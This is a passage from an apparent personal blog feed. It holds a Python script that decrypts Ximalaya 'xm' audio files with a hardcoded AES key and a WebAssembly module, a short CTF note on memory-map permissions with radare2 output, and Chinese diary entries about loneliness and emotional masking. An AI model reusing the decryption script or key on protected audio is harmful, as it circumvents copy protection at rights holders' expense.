class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(x,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># return number of id3 bytes</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_xm_info</span>(<span class="params">data:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="comment"># print(EasyID3(io.BytesIO(data)))</span></span><br><span class="line">    id3 = ID3(io.BytesIO(data),v2_version=<span class="number">3</span>)</span><br><span class="line">    id3value = XMInfo()</span><br><span class="line">    id3value.title = <span class="built_in">str</span>(id3[<span class="string">&quot;TIT2&quot;</span>])</span><br><span class="line">    id3value.album = <span class="built_in">str</span>(id3[<span class="string">&quot;TALB&quot;</span>])</span><br><span class="line">    id3value.artist = <span class="built_in">str</span>(id3[<span class="string">&quot;TPE1&quot;</span>])</span><br><span class="line">    id3value.tracknumber = <span class="built_in">int</span>(<span class="built_in">str</span>(id3[<span class="string">&quot;TRCK&quot;</span>]))</span><br><span class="line">    id3value.ISRC = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> id3.get(<span class="string">&quot;TSRC&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">str</span>(id3[<span class="string">&quot;TSRC&quot;</span>])</span><br><span class="line">    id3value.encodedby = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> id3.get(<span class="string">&quot;TENC&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">str</span>(id3[<span class="string">&quot;TENC&quot;</span>])</span><br><span class="line">    id3value.size = <span class="built_in">int</span>(<span class="built_in">str</span>(id3[<span class="string">&quot;TSIZ&quot;</span>]))</span><br><span class="line">    id3value.header_size = id3.size</span><br><span class="line">    id3value.encoding_technology = <span class="built_in">str</span>(id3[<span class="string">&quot;TSSE&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> id3value</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">function d(n, t, e) &#123;</span></span><br><span class="line"><span class="string">        if (void 0 === e) &#123;</span></span><br><span class="line"><span class="string">            const e = i.encode(n),</span></span><br><span class="line"><span class="string">                r = t(e.length);</span></span><br><span class="line"><span class="string">            return u().subarray(r, r + e.length).set(e), c = e.length, r</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        let r = n.length,</span></span><br><span class="line"><span class="string">            o = t(r);</span></span><br><span class="line"><span class="string">        const d = u();</span></span><br><span class="line"><span class="string">        let a = 0;</span></span><br><span class="line"><span class="string">        for (; a &lt; r; a++) &#123;</span></span><br><span class="line"><span class="string">            const t = n.charCodeAt(a);</span></span><br><span class="line"><span class="string">            if (t &gt; 127) break;</span></span><br><span class="line"><span class="string">            d[o + a] = t</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if (a !== r) &#123;</span></span><br><span class="line"><span class="string">            0 !== a &amp;&amp; (n = n.slice(a)), o = e(o, r, r = a + 3 * n.length);</span></span><br><span class="line"><span class="string">            const t = u().subarray(o + a, o + r);</span></span><br><span class="line"><span class="string">            a += f(n, t).written</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return c = a, o</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">const s = r.a(-16),</span></span><br><span class="line"><span class="string">    y = d(n, r.c, r.d),</span></span><br><span class="line"><span class="string">    h = c,</span></span><br><span class="line"><span class="string">    g = d(t, r.c, r.d),</span></span><br><span class="line"><span class="string">    p = c;</span></span><br><span class="line"><span class="string">console.log(r,r.a(0),r.c,r.d);</span></span><br><span class="line"><span class="string">console.log(s,y,h,g,p);</span></span><br><span class="line"><span class="string">r.g(s, y, h, g, p);</span></span><br><span class="line"><span class="string">console.log(s,y,h,g,p);</span></span><br><span class="line"><span class="string">var e = l()[s / 4 + 0],</span></span><br><span class="line"><span class="string">    o = l()[s / 4 + 1],</span></span><br><span class="line"><span class="string">    u = l()[s / 4 + 2],</span></span><br><span class="line"><span class="string">    i = l()[s / 4 + 3],</span></span><br><span class="line"><span class="string">    f = e,</span></span><br><span class="line"><span class="string">    a = o;</span></span><br><span class="line"><span class="string">console.log(e,o,u,i,f,a);</span></span><br><span class="line"><span class="string">if (i) throw f = 0, a = 0, w(u);</span></span><br><span class="line"><span class="string">return b(f, a)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_printable_count</span>(<span class="params">x:<span class="built_in">bytes</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(x):</span><br><span class="line">        <span class="comment"># all pritable</span></span><br><span class="line">        <span class="keyword">if</span> c &lt; <span class="number">0x20</span> <span class="keyword">or</span> c &gt; <span class="number">0x7e</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_printable_bytes</span>(<span class="params">x:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> x[:get_printable_count(x)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xm_decrypt</span>(<span class="params">raw_data</span>):</span><br><span class="line">    <span class="comment"># load xm encryptor</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;loading xm encryptor&quot;</span>)</span><br><span class="line">    xm_encryptor = Instance(Module(</span><br><span class="line">        Store(),</span><br><span class="line">        pathlib.Path(<span class="string">&quot;./xm_encryptor.wasm&quot;</span>).read_bytes()</span><br><span class="line">    ))</span><br><span class="line">    <span class="comment"># decode id3</span></span><br><span class="line">    xm_info = get_xm_info(raw_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;id3 header size: &quot;</span>,<span class="built_in">hex</span>(xm_info.header_size))</span><br><span class="line">    encrypted_data = raw_data[xm_info.header_size:xm_info.header_size+xm_info.size:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Stage 1 aes-256-cbc</span></span><br><span class="line">    xm_key = <span class="string">b&quot;ximalayaximalayaximalayaximalaya&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;decrypt stage 1 (aes-256-cbc):\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    data length = <span class="subst">&#123;<span class="built_in">len</span>(encrypted_data)&#125;</span>,\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    key = <span class="subst">&#123;xm_key&#125;</span>,\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    iv = <span class="subst">&#123;xm_info.iv().<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    cipher = AES.new(xm_key, AES.MODE_CBC, xm_info.iv())</span><br><span class="line">    de_data = cipher.decrypt(pad(encrypted_data, <span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="comment"># Stage 2 xmDecrypt</span></span><br><span class="line">    de_data = get_printable_bytes(de_data)</span><br><span class="line">    track_id = <span class="built_in">str</span>(xm_info.tracknumber).encode()</span><br><span class="line">    stack_pointer = xm_encryptor.exports.a(-<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(stack_pointer, <span class="built_in">int</span>)</span><br><span class="line">    de_data_offset = xm_encryptor.exports.c(<span class="built_in">len</span>(de_data))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(de_data_offset,<span class="built_in">int</span>)</span><br><span class="line">    track_id_offset = xm_encryptor.exports.c(<span class="built_in">len</span>(track_id))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(track_id_offset, <span class="built_in">int</span>)</span><br><span class="line">    memory_i = xm_encryptor.exports.i</span><br><span class="line">    memview_unit8:Uint8Array = memory_i.uint8_view(offset=de_data_offset)</span><br><span class="line">    <span class="keyword">for</span> i,b <span class="keyword">in</span> <span class="built_in">enumerate</span>(de_data):</span><br><span class="line">        memview_unit8[i] = b</span><br><span class="line">    memview_unit8: Uint8Array = memory_i.uint8_view(offset=track_id_offset)</span><br><span class="line">    <span class="keyword">for</span> i,b <span class="keyword">in</span> <span class="built_in">enumerate</span>(track_id):</span><br><span class="line">        memview_unit8[i] = b</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytearray</span>(memory_i.buffer)[track_id_offset:track_id_offset+<span class="built_in">len</span>(track_id)].decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;decrypt stage 2 (xmDecrypt):\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    stack_pointer = <span class="subst">&#123;stack_pointer&#125;</span>,\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    data_pointer = <span class="subst">&#123;de_data_offset&#125;</span>, data_length = <span class="subst">&#123;<span class="built_in">len</span>(de_data)&#125;</span>,\n&quot;</span></span><br><span class="line">          <span class="string">f&quot;    track_id_pointer = <span class="subst">&#123;track_id_offset&#125;</span>, track_id_length = <span class="subst">&#123;<span class="built_in">len</span>(track_id)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    xm_encryptor.exports.g(stack_pointer,de_data_offset,<span class="built_in">len</span>(de_data),track_id_offset,<span class="built_in">len</span>(track_id))</span><br><span class="line">    memview_int32: Int32Array = memory_i.int32_view(offset=stack_pointer // <span class="number">4</span>)</span><br><span class="line">    result_pointer = memview_int32[<span class="number">0</span>]</span><br><span class="line">    result_length = memview_int32[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> memview_int32[<span class="number">2</span>] == <span class="number">0</span>, memview_int32[<span class="number">3</span>] == <span class="number">0</span></span><br><span class="line">    result_data = <span class="built_in">bytearray</span>(memory_i.buffer)[result_pointer:result_pointer+result_length].decode()</span><br><span class="line">    <span class="comment"># Stage 3 combine</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Stage 3 (base64)&quot;</span>)</span><br><span class="line">    decrypted_data = base64.b64decode(xm_info.encoding_technology+result_data)</span><br><span class="line">    final_data = decrypted_data + raw_data[xm_info.header_size+xm_info.size::]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> xm_info,final_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xm_decrypt_v12</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_ext</span>(<span class="params">data</span>):</span><br><span class="line">    exts = [<span class="string">&quot;m4a&quot;</span>,<span class="string">&quot;mp3&quot;</span>,<span class="string">&quot;flac&quot;</span>,<span class="string">&quot;wav&quot;</span>]</span><br><span class="line">    value = magic.from_buffer(data).lower()</span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> exts:</span><br><span class="line">        <span class="keyword">if</span> ext <span class="keyword">in</span> value:</span><br><span class="line">            <span class="keyword">return</span> ext</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">f&quot;unexpected format <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_xm_file</span>(<span class="params">from_file,output=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;decrypting <span class="subst">&#123;from_file&#125;</span>&quot;</span>)</span><br><span class="line">    data = read_file(from_file)</span><br><span class="line">    info, audio_data = xm_decrypt(data)</span><br><span class="line">    <span class="keyword">if</span> output == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        output = re.sub(<span class="string">r&#x27;[^\w\-_\. ]&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, info.title)+<span class="string">&quot;.&quot;</span>+find_ext(audio_data[:<span class="number">0xff</span>])</span><br><span class="line">    buffer = io.BytesIO(audio_data)</span><br><span class="line">    tags = mutagen.File(buffer,easy=<span class="literal">True</span>)</span><br><span class="line">    tags[<span class="string">&quot;title&quot;</span>] = info.title</span><br><span class="line">    tags[<span class="string">&quot;album&quot;</span>] = info.album</span><br><span class="line">    tags[<span class="string">&quot;artist&quot;</span>] = info.artist</span><br><span class="line">    <span class="built_in">print</span>(tags.pprint())</span><br><span class="line">    tags.save(buffer)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        buffer.seek(<span class="number">0</span>)</span><br><span class="line">        f.write(buffer.read())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;decrypt succeed, file write to <span class="subst">&#123;output&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python decrypt_xm.py [&lt;filename&gt; ...]&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> sys.argv[<span class="number">1</span>::]:</span><br><span class="line">        decrypt_xm_file(filename)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote>
<ol>
<li><a href="https://www.electronjs.org/docs/latest/tutorial/application-debugging">https://www.electronjs.org/docs/latest/tutorial/application-debugging</a></li>
<li><a href="https://www.electronjs.org/docs/latest/tutorial/debugging-main-process">https://www.electronjs.org/docs/latest/tutorial/debugging-main-process</a></li>
<li><a href="https://nodejs.org/en/docs/guides/debugging-getting-started/">https://nodejs.org/en/docs/guides/debugging-getting-started/</a></li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>electron</tag>
        <tag>reverse</tag>
        <tag>encryption</tag>
        <tag>ximalya</tag>
        <tag>webassembly</tag>
      </tags>
  </entry>
  <entry>
    <title>[日记] 2023 10 01</title>
    <url>/articles/diary/diary20231001/</url>
    <content><![CDATA[<p>撐不下了去</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>Writable memory section before init and after init</title>
    <url>/articles/ctf/writable-memory-section-before-init-and-after-init/</url>
    <content><![CDATA[<h1 id="0x0-Different"><a href="#0x0-Different" class="headerlink" title="0x0 Different"></a>0x0 Different</h1><p>The memory mapping is little differnt</p>
<p>when <code>init</code> function is not called, notice that <code>rw-</code> page in the memory map have size of <strong>0x2000</strong> from  <strong>0x0804b000</strong> - <strong>0x0804d000</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804b000 - 0x0804d000 - usr     8K s rw- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map.</span><br></pre></td></tr></table></figure>

<p>however, after enter the main or called <code>init</code> function, the <code>rw-</code> page in the memory map now have size of <strong>0x1000</strong> from <strong>0x0804c000</strong> - <strong>0x0804d000</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804c000 - 0x0804d000 - usr     4K s rw- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; obj._GLOBAL_OFFSET_TABLE_</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="0x1-Reason"><a href="#0x1-Reason" class="headerlink" title="0x1 Reason"></a>0x1 Reason</h1><p>init function will write data to  <strong>0x0804b000</strong> - <strong>0x0804c000</strong>, therefore, before init or before enter main, this page of memory is writable. </p>
<p>However, after finish the init and enter main. this page should no longer be modified. Therefore, the binary will memory protect this page and make it only readable. which means the writable area now is only in range of <strong>0x0804c000</strong> - <strong>0x0804d000</strong></p>
<h1 id="0x2-Some-Reminder"><a href="#0x2-Some-Reminder" class="headerlink" title="0x2 Some Reminder"></a>0x2 Some Reminder</h1><p>if you want to find some writable area, be sure to use dm (orvmmap in gdb) after the binary have execute to main.</p>
<h1 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0xf7fc1120]&gt; dm</span><br><span class="line">0x08048000 - 0x08049000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; segment.ehdr</span><br><span class="line">0x08049000 - 0x0804a000 - usr     4K s r-x /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r_x</span><br><span class="line">0x0804a000 - 0x0804b000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r__</span><br><span class="line">0x0804b000 - 0x0804d000 - usr     8K s rw- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.rw_</span><br><span class="line">0xf7fba000 - 0xf7fbe000 - usr    16K s r-- [vvar] [vvar] ; map._vvar_.r__</span><br><span class="line">0xf7fbe000 - 0xf7fc0000 - usr     8K s r-x [vdso] [vdso] ; map._vdso_.r_x</span><br><span class="line">0xf7fc0000 - 0xf7fc1000 - usr     4K s r-- /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7fc1000 - 0xf7fdf000 * usr   120K s r-x /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so ; map._usr_lib_i386_linux_gnu_ld_2.31.so.r_x</span><br><span class="line">0xf7fdf000 - 0xf7fea000 - usr    44K s r-- /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so ; map._usr_lib_i386_linux_gnu_ld_2.31.so.r__</span><br><span class="line">0xf7feb000 - 0xf7fed000 - usr     8K s rw- /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so ; map._usr_lib_i386_linux_gnu_ld_2.31.so.rw_</span><br><span class="line">0xffe81000 - 0xffea2000 - usr   132K s rw- [stack] [stack] ; map._stack_.rw_</span><br><span class="line">[0x08049235]&gt; dcu main</span><br><span class="line">[0x08049235]&gt; dm</span><br><span class="line">0x08048000 - 0x08049000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; segment.ehdr</span><br><span class="line">0x08049000 - 0x0804a000 * usr     4K s r-x /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r_x</span><br><span class="line">0x0804a000 - 0x0804b000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r__</span><br><span class="line">0x0804b000 - 0x0804c000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.rw_</span><br><span class="line">0x0804c000 - 0x0804d000 - usr     4K s rw- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; obj._GLOBAL_OFFSET_TABLE_</span><br><span class="line">0xf7dba000 - 0xf7dd7000 - usr   116K s r-- /usr/lib/i386-linux-gnu/libc-2.31.so /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7dd7000 - 0xf7f32000 - usr   1.4M s r-x /usr/lib/i386-linux-gnu/libc-2.31.so /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7f32000 - 0xf7fa2000 - usr   448K s r-- /usr/lib/i386-linux-gnu/libc-2.31.so /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fa2000 - 0xf7fa3000 - usr     4K s --- /usr/lib/i386-linux-gnu/libc-2.31.so /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fa3000 - 0xf7fa5000 - usr     8K s r-- /usr/lib/i386-linux-gnu/libc-2.31.so /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fa5000 - 0xf7fa7000 - usr     8K s rw- /usr/lib/i386-linux-gnu/libc-2.31.so /usr/lib/i386-linux-gnu/libc-2.31.so ; edi</span><br><span class="line">0xf7fa7000 - 0xf7fa9000 - usr     8K s rw- unk0 unk0</span><br><span class="line">0xf7fb8000 - 0xf7fba000 - usr     8K s rw- unk1 unk1</span><br><span class="line">0xf7fba000 - 0xf7fbe000 - usr    16K s r-- [vvar] [vvar] ; map._vvar_.r__</span><br><span class="line">0xf7fbe000 - 0xf7fc0000 - usr     8K s r-x [vdso] [vdso] ; map._vdso_.r_x</span><br><span class="line">0xf7fc0000 - 0xf7fc1000 - usr     4K s r-- /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7fc1000 - 0xf7fdf000 - usr   120K s r-x /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so ; map._usr_lib_i386_linux_gnu_ld_2.31.so.r_x</span><br><span class="line">0xf7fdf000 - 0xf7fea000 - usr    44K s r-- /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so ; map._usr_lib_i386_linux_gnu_ld_2.31.so.r__</span><br><span class="line">0xf7feb000 - 0xf7fec000 - usr     4K s r-- /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so ; map._usr_lib_i386_linux_gnu_ld_2.31.so.rw_</span><br><span class="line">0xf7fec000 - 0xf7fed000 - usr     4K s rw- /usr/lib/i386-linux-gnu/ld-2.31.so /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xffe81000 - 0xffea2000 - usr   132K s rw- [stack] [stack] ; map._stack_.rw_</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>[日记] 2023 12 10</title>
    <url>/articles/diary/diary20231210/</url>
    <content><![CDATA[<p>昨天有个人，一个应该忘掉我的人，给我祝了生日快乐。我破防了。</p>
<p>怎么说呢，感觉像个孤独患者在那里自我拉扯。</p>
<p>我也不知道为啥，我从小就能很清楚的感受他人的情绪，不论是从表情上还是从言语上，他人的情绪对我仿佛就是没有那个掩饰一般。喜，怒，哀，乐。任何情绪，我都能如切身的体会到一般感受到他人的情绪。我甚至能一定的从情绪中感受到一部分他人的真实想法。</p>
<p>他人即地狱，我处理不来这种事情。这些事情对于我来说一种巨大的压力，我一度无法处理这种麻烦而陷入自闭。而现在这种自闭的时间越來越长也越來难以调节了。</p>
<p>总之，因为这个特质，我有时候会过于注重自己的言行对于他人的感受，我一直小心翼翼的活着深怕自己对他人造成什么影响。我一直想修正这个问题，我尝试过很多办法，有些没用，有些开始有用，但随着时间的推移效果越来越弱。我只能强硬的把自己的内心隐藏起来，把自己感性的一面深深的藏起来，用完全理性的态度来生活。</p>
<p>为了压制住内心的情感，防止自己的言行对他人造成麻烦。我试图给自己的带上一个个面具，面对不同的人，都用着不同的面具。祈求于这种方式能够至少在表面上维护与建立起我正常的社交关系。</p>
<p>这种方式很不讲道理，但是很有效。谁能想到脸部红心不跳的说出的话语实际上是谎言呢。我知道欺骗别人是不好的，但是让别人不要让别人麻烦或许对于我而言更为重要，所以对此，我与愿意去欺骗他人。</p>
<p>也许是面具带的多了，我开始丧失了表达自己内心真实情感想法的能力，我害怕自己真实的情感会造成他人的不适，会让别人对我另有看法。我也害怕这幅面具消逝之后，其他人是否能够接受真实的自己。</p>
<p>我知道这些都是些老生畅谈的问题了，也许对于整个社会来说，这个问题就是常见的，小小的事情。但对于我来说就是隔在我与现实社会的一道墙，一个屏幕。我害怕去推开他，我也不愿去推开他。</p>
<p>可惜这个方法也快要失效了，虽然我依旧能够扮演出我想要的那个角色，内心里却有一种无法控制的力量想要把这个面具撕毁，撤碎。我害怕，非常害怕表达出真实的情感，害怕隐藏在一个个面具后的我被揭露出来。所以我开始自闭，试图远离一切人际交流关系，试图把自己和整个人际关系分割开来。</p>
<p>但是，为什么呢，这究竟是为什么呢。明明已经习惯了这么多年来一个人孤独的活着，不把自己的内心展现给他人。我明明刻意的隐藏自己的生日，刻意的不和任何人提起自己的生日，甚至试图让自己忘掉我还有生日这件事情。</p>
<p>明明我不想有人给我发，但是我就是控制不住的破防了。明明我知道对于她来说，就是突然记起来的随手一发，我还是像一个在阴湿角落祈求光明的可怜虫，故作无意的问她为什么突然发这个。</p>
<p>真是好笑</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>[日记] 2024 01 03 night</title>
    <url>/articles/diary/diary20240103-2/</url>
    <content><![CDATA[<p>怎么说呢，我从小到大就是一个没有什么主见的人。也不是没有什么主见吧，可能更准确的说法是我好像一直是为他人而活着的。就说小学的时候，我当时啥也不知道也不记得什么事情了，只要是我认为我做的事会让父母开心，那我会去做。不管是上什么乱七八糟的兴趣班，还是努力拿个啥子的学习小能手。</p>
<p>而在初中的那段时间，我生活的动力就完全为了我喜欢的女生。</p>
<p>我是在一个当地的重点初中上的学，父母给我选择这所学校的主要原因还是因为我的身体。我一直患有过敏性鼻炎，就是对尘螨，花粉一类的东西过敏。而且一直治不好。所以家里给我选了一个周围环境较好的初中读书，希望鼻炎不要那么严重。</p>
<p>我在初中的成绩一直不错，虽然拿不到班级前五，但是中上游还是有的。主要原因还是偏科偏的有点厉害，经常是数学科学能拿95,96，但要说起文科，那就是一塌糊涂了。英语政治这些还行，靠记忆还能勉强混个85左右。语文就是纯纯的在70分上下徘徊了，阅读理解实在是做不明白。（都是100分制）</p>
<p>我的同桌在数学这方面就有点不是很好了。或许一开始是我看不下去她弄不明白某道题目，我就开始教她怎么做题。一来二去的我们两个也就熟了起来。我给他讲讲题，她也会借她的语文作业给我参考。</p>
<p>后来不知道从哪天起，我发现我有点离不开她了，每天上学的动力就是去见她。学习的目标也从让家里人开心变成了如何学的明白点，然后狠狠的辅导她的功课。 &#x2F;&#x2F; 怎么说呢，感觉有点扭曲了。</p>
<p>总之不管怎么说，她的数学也的确慢慢的好起来了，甚至在几场小考中比我考的都高。</p>
<p>这样的关系即使我们两个不是同桌之后依然存在，直到初三上学期。</p>
<p>本来我的目标就是单纯的去中考考个好高中，或者走提前招生想办法进个重点高中，如果能把她也给拐到同一所高中最好。嘛，即使不是同一所高中，至少是在同一所城市嘛。</p>
<p>但因为我的鼻炎实在是好不了而且有愈发严重的趋势，我父母打算把我直接丢到国外去读书，毕竟相比较当时的国内空气质量来说，国外的空气质量确实要好不少。</p>
<p>那我当时是坚决不同意啊，我初三还没上完呢，我还想和她多见几面，怎么可以现在就润。总之几番拉扯之下，也是我当时不够坚定的原因，最终我爸妈决定先让我在国内找一个国际学校读一读，然后大学再去国外上。</p>
<p>这个时候先插入一个设定，我初中的时候有课间餐这东西存在，就是每天的第n节课后（n是几忘了），负责送货的人会把蛋糕啥的丢教室门口，然后大伙一下课一拥而上去恰蛋糕。</p>
<p>在这两年，她的那份都是我出去拿然后给她带进来了。ok 设定结束</p>
<p>我和她说了这事，说我爸妈感觉想送我到国际学校读书。她当时也没什么特别反应，就回了句 &quot;国际学校啊，那也挺好的&quot;，然后也没有后续了。</p>
<p>大约是初三上中旬的某一天，我一如往常的帮她拿了蛋糕。她没有像往常一样接过，而是有点认真的给我说，“X, 以后不用帮我拿了” (X &#x3D; 我的全名)。</p>
<p>我当时有点蒙，反正下意识的就点了点头说行吧。</p>
<p>从那以后，我俩的交集就慢慢的变少了。</p>
<p>之后的日子我反正就是浑浑噩噩的度过，也没啥可说的了。总之结果就是我顺利考进了那所国际学校，她进了一所本地的普高。</p>
